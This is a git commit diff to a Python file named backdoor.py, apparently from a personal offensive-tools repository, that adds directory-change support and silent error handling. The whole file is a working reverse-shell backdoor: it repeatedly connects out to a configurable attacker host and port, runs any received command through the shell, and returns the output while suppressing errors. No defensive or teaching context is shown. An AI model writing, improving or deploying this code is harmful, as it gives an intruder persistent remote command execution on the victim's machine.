dd32d38ec6a9672fd7f27c071474a68b2cf8d8a7
xorandd <xorandd@proton.me>
2025-04-24 00:55:45 +0100

    added cd command support and error handling

--- backdoor/backdoor.py
+++ backdoor/backdoor.py
@@ -1,31 +1,42 @@
 import socket
 import subprocess
 import time
+import os
+
+LHOST = '192.168.1.186' # CHANGE THIS
+LPORT = 4545            # CHANGE THIS
 
 def command_exec(command):
-    return subprocess.check_output(command, shell=True)
+    try:
+        if command.startswith("cd "):
+            path = command[3:].strip()
+            os.chdir(path)
+            return b""
+        else:
+            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+    except:
+        return b""
 
 def connect():
     while True:
         try:
             connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             connection.connect((LHOST, LPORT))
-            connection.send(("\nSuccessfully connected\n").encode())
+            connection.send("[*] Successfully connected\n".encode())
             return connection
         except socket.error:
             time.sleep(5)
 
-
-LHOST = '192.168.1.186' # CHANGE THIS
-LPORT = 4545            # CHANGE THIS
-
 connection = connect()
 
 while True:
-    command_query = connection.recv(1024).decode()
+    try:
+        command_query = connection.recv(4096).decode().strip()
 
-    if not command_query:
-        continue
+        if not command_query:
+            continue
 
-    command_output = command_exec(command_query)
-    connection.send(command_output)
+        command_output = command_exec(command_query)
+        connection.send(command_output)
+    except Exception:
+        pass
